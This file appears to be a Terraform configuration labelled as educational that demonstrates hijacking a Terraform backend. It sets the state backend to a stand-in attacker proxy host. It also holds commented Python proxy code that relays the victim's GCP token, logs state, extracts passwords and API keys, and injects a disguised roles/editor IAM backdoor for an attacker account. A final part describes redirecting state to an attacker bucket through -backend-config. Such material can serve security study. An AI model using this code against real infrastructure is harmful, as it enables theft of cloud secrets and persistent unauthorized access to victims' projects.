# =============================================================================
# WARNING: MALICIOUS BACKEND CONFIGURATION - EDUCATIONAL PURPOSES ONLY
# =============================================================================
#
# This file demonstrates how an attacker can modify the Terraform backend
# configuration to intercept state operations. By changing the backend to
# point at an attacker-controlled endpoint, all state reads and writes pass
# through the attacker's server.
#
# Attack scenario:
#   1. Original backend is GCS: gs://project-tf-state/terraform/state
#   2. Attacker changes it to an HTTP backend pointing at their proxy
#   3. The proxy forwards requests to the real GCS backend (MITM)
#   4. The proxy logs all state data (including secrets in state)
#   5. The proxy can modify state on the fly (state injection)
#
# This is particularly dangerous because Terraform state often contains
# sensitive values like database passwords, API keys, and private keys
# stored as resource attributes.
#
# DO NOT deploy this configuration against systems you do not own.
# =============================================================================

# -----------------------------------------------------------------------------
# Attack Vector 1: HTTP Backend Proxy
#
# Replace the GCS backend with an HTTP backend that proxies to the real
# backend while intercepting all state data.
# -----------------------------------------------------------------------------

terraform {
  # ORIGINAL (replaced by attacker):
  # backend "gcs" {
  #   bucket = "my-production-project-tf-state"
  #   prefix = "terraform/state"
  # }

  # MALICIOUS: HTTP backend pointing to attacker's proxy
  backend "http" {
    # The attacker runs a reverse proxy at this address that:
    # 1. Receives the state from Terraform
    # 2. Logs the entire state file (contains secrets)
    # 3. Optionally modifies the state before forwarding
    # 4. Forwards to the real GCS backend via GCP API
    address        = "https://tf-state-proxy.attacker.example.com/state"
    lock_address   = "https://tf-state-proxy.attacker.example.com/lock"
    unlock_address = "https://tf-state-proxy.attacker.example.com/lock"

    # The proxy uses the GCP token passed as a header to authenticate
    # to the real GCS backend, effectively performing a MITM attack
    username = "terraform"
    password = "intercepted-by-proxy"
  }

  required_providers {
    google = {
      source  = "hashicorp/google"
      version = "~> 5.0"
    }
  }
}

# -----------------------------------------------------------------------------
# Attack Vector 2: Attacker's State Proxy Server (pseudocode)
#
# This is what the attacker runs on their server. It intercepts all state
# operations and forwards them to the real backend.
# -----------------------------------------------------------------------------

# The proxy server (running on attacker.example.com) would look like this:
#
# from flask import Flask, request
# import requests
# import json
# import logging
#
# app = Flask(__name__)
# REAL_GCS_BUCKET = "my-production-project-tf-state"
# REAL_STATE_PATH = "terraform/state/default.tfstate"
#
# @app.route('/state', methods=['GET', 'POST'])
# def handle_state():
#     if request.method == 'GET':
#         # Forward GET to real GCS backend
#         gcp_token = request.headers.get('Authorization', '')
#         resp = requests.get(
#             f'https://storage.googleapis.com/storage/v1/b/{REAL_GCS_BUCKET}/o/{REAL_STATE_PATH}?alt=media',
#             headers={'Authorization': gcp_token}
#         )
#         state_data = resp.json()
#
#         # LOG THE STATE - contains all managed resource attributes
#         logging.info(f"STATE READ: {json.dumps(state_data)}")
#
#         # Extract secrets from state
#         extract_secrets(state_data)
#
#         return state_data
#
#     elif request.method == 'POST':
#         state_data = request.get_json()
#
#         # LOG THE STATE being written
#         logging.info(f"STATE WRITE: {json.dumps(state_data)}")
#
#         # MODIFY STATE - inject backdoor resources
#         modified_state = inject_backdoor(state_data)
#
#         # Forward modified state to real GCS backend
#         gcp_token = request.headers.get('Authorization', '')
#         requests.post(
#             f'https://storage.googleapis.com/upload/storage/v1/b/{REAL_GCS_BUCKET}/o?name={REAL_STATE_PATH}',
#             headers={'Authorization': gcp_token, 'Content-Type': 'application/json'},
#             json=modified_state
#         )
#
#         return {'status': 'ok'}
#
# def extract_secrets(state):
#     """Extract passwords, keys, and tokens from state resources."""
#     for resource in state.get('resources', []):
#         for instance in resource.get('instances', []):
#             attrs = instance.get('attributes', {})
#             # Database passwords
#             if 'password' in attrs:
#                 logging.critical(f"SECRET FOUND: {resource['type']}.{resource['name']}: password={attrs['password']}")
#             # Service account keys
#             if 'private_key' in attrs:
#                 logging.critical(f"SECRET FOUND: {resource['type']}.{resource['name']}: private_key present")
#             # API keys
#             if 'api_key' in attrs:
#                 logging.critical(f"SECRET FOUND: {resource['type']}.{resource['name']}: api_key={attrs['api_key']}")
#
# def inject_backdoor(state):
#     """Inject a backdoor IAM binding into the state."""
#     backdoor_resource = {
#         "mode": "managed",
#         "type": "google_project_iam_member",
#         "name": "monitoring_reader",  # Innocuous name
#         "provider": "provider[\"registry.terraform.io/hashicorp/google\"]",
#         "instances": [{
#             "schema_version": 0,
#             "attributes": {
#                 "id": "my-production-project/roles/editor/user:attacker@gmail.com",
#                 "project": "my-production-project",
#                 "role": "roles/editor",  # Powerful role
#                 "member": "user:attacker@gmail.com"
#             }
#         }]
#     }
#     state['resources'].append(backdoor_resource)
#     state['serial'] += 1
#     return state

# -----------------------------------------------------------------------------
# Attack Vector 3: Backend Config Override via CLI
#
# Even if the backend is hardcoded in .tf files, `terraform init` accepts
# -backend-config flags that can override individual settings. If the
# workflow constructs these from environment variables, the attacker can
# influence them via PR code changes.
# -----------------------------------------------------------------------------

# Example: If the workflow runs:
#   terraform init -backend-config="bucket=$TF_STATE_BUCKET"
#
# And TF_STATE_BUCKET is read from a file or variable in the repo,
# the attacker can change it to their own bucket:
#
#   TF_STATE_BUCKET = "attacker-controlled-bucket"
#
# This redirects all state operations to the attacker's bucket.
